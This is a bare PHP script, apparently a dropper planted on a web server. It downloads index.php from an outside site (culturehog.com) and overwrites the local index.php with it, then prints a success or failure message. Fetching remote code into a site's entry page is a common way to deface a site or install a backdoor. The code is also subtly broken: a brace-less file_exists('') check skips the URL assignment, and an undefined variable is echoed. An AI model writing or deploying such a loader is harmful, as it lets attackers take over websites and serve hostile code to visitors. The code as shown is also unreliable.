<?php

if (file_exists(''))
/* Source File URL */
$remote_file_url = 'https://culturehog.com/index.php';

/* New file name and path for this file */
$local_file = 'index.php';

/* Copy the file from source url to server */
$copy = copy( $remote_file_url, $local_file );

/* Add notice for success/failure */
if( !$copy ) {
    echo "Doh! failed to copy $file...\n";
}
else{
    echo "WOOT! success to copy $file...\n";
}
